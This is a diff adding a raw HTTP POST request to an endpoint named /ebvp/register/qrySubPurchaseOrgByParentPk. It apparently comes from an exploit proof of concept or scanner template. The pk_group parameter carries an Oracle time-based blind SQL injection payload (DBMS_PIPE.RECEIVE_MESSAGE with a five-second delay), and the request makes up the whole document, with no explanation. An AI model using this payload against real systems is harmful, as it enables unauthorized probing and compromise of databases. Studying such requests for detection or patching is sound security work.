@@ -1,0 +1,5 @@
+POST /ebvp/register/qrySubPurchaseOrgByParentPk HTTP/1.1
+Host: 
+Content-Type: application/x-www-form-urlencoded
+
+pk_group=1' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('RDS',5) --
